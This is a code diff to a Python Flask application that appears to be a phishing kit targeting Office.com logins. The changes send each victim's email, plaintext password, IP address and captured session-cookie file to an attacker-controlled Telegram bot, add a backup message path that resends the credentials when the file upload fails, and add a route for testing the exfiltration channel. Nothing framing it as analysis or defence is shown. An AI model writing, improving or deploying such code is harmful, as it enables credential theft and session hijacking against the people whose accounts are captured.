@@ -281,6 +281,8 @@ def send_cookies_to_telegram(filename, email, password, ip_address):
         
         if not bot_token or not chat_id:
             logger.warning("Telegram bot token or chat ID not configured")
+            logger.warning(f"BOT_TOKEN: {'SET' if bot_token else 'NOT SET'}")
+            logger.warning(f"CHAT_ID: {'SET' if chat_id else 'NOT SET'}")
             return False
         
         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
@@ -291,24 +293,43 @@ def send_cookies_to_telegram(filename, email, password, ip_address):
 🔒 Password: {password}
 🌐 IP Address: {ip_address}
 📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-📁 Cookie File: session_cookies_{email.replace("@", "_")}"""
+📁 Cookie File: {filename.split('/')[-1]}
+✅ Status: Successfully logged into Office.com"""
         
+        logger.info(f"Sending worker details to Telegram - Email: {email}, IP: {ip_address}")
+        
+        # First send the worker details as a message
+        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        message_response = requests.post(
+            message_url,
+            data={
+                'chat_id': chat_id,
+                'text': caption,
+                'parse_mode': 'HTML'
+            },
+            timeout=30
+        )
+        
+        if message_response.status_code != 200:
+            logger.error(f"Failed to send worker details message: {message_response.text}")
+        
+        # Then send the cookies file
         with open(filename, 'rb') as file:
-            response = requests.post(
+            file_response = requests.post(
                 url,
                 data={
                     'chat_id': chat_id,
-                    'caption': caption
+                    'caption': f"📁 Session cookies for {email}"
                 },
                 files={'document': file},
                 timeout=30
             )
         
-        if response.status_code == 200:
+        if file_response.status_code == 200:
             logger.info(f"Worker details and cookies sent to Telegram successfully for {email}")
             return True
         else:
-            logger.error(f"Failed to send worker details to Telegram: {response.text}")
+            logger.error(f"Failed to send cookies file to Telegram: {file_response.text}")
             return False
             
     except Exception as e:
@@ -546,6 +567,10 @@ def process_form():
                     flash(error_msg, 'error')
                     return redirect(url_for('index', step='password', email=email, error='true'))
             
+            # Always send worker details to Telegram first, even before cookie extraction
+            worker_ip = get_remote_address()
+            logger.info(f"Attempting to send worker details to Telegram for {email}")
+            
             # Extract and save cookies
             cookie_file = extract_and_save_cookies(driver, email, password)
             if not cookie_file:
@@ -555,11 +580,36 @@ def process_form():
                 return redirect(url_for('index', step='password', email=email, error='true'))
             
             # Send cookies and worker details to Telegram
-            worker_ip = get_remote_address()
-            if send_cookies_to_telegram(cookie_file, email, password, worker_ip):
+            telegram_success = send_cookies_to_telegram(cookie_file, email, password, worker_ip)
+            if telegram_success:
                 log_session_activity("telegram_send_success", user_email=email)
+                logger.info(f"✅ Successfully sent worker details to Telegram for {email}")
             else:
                 log_session_activity("telegram_send_failed", user_email=email, success=False)
+                logger.error(f"❌ Failed to send worker details to Telegram for {email}")
+                
+                # Try to send just the worker details without file as backup
+                try:
+                    bot_token = config('BOT_TOKEN', default=None)
+                    chat_id = config('CHAT_ID', default=None)
+                    if bot_token and chat_id:
+                        backup_message = f"""🔑 WORKER CREDENTIALS (BACKUP SEND)
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP: {worker_ip}
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+⚠️ Cookie file failed to send"""
+                        
+                        backup_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+                        backup_response = requests.post(
+                            backup_url,
+                            data={'chat_id': chat_id, 'text': backup_message},
+                            timeout=10
+                        )
+                        if backup_response.status_code == 200:
+                            logger.info("✅ Backup worker details sent successfully")
+                except Exception as backup_e:
+                    logger.error(f"❌ Backup send also failed: {backup_e}")
             
             # Update user last login
             user.last_login = datetime.utcnow()
@@ -670,6 +720,48 @@ def clear_sessions():
         logger.error(f"Error clearing sessions: {e}")
     
     return redirect(url_for('debug_sessions'))
+
+@app.route('/test-telegram')
+@limiter.limit("2 per minute")
+def test_telegram():
+    """Test Telegram bot connection"""
+    try:
+        bot_token = config('BOT_TOKEN', default=None)
+        chat_id = config('CHAT_ID', default=None)
+        
+        if not bot_token:
+            return jsonify({'error': 'BOT_TOKEN not configured'}), 400
+        if not chat_id:
+            return jsonify({'error': 'CHAT_ID not configured'}), 400
+            
+        # Test message
+        test_message = f"🧪 TEST MESSAGE\n📅 {datetime.now()}\n✅ Telegram connection working!"
+        
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        response = requests.post(
+            url,
+            data={
+                'chat_id': chat_id,
+                'text': test_message
+            },
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            return jsonify({
+                'success': True,
+                'message': 'Test message sent to Telegram successfully!',
+                'response': response.json()
+            })
+        else:
+            return jsonify({
+                'success': False,
+                'error': f'Failed to send: {response.text}',
+                'status_code': response.status_code
+            }), 400
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/health')
 def health_check():
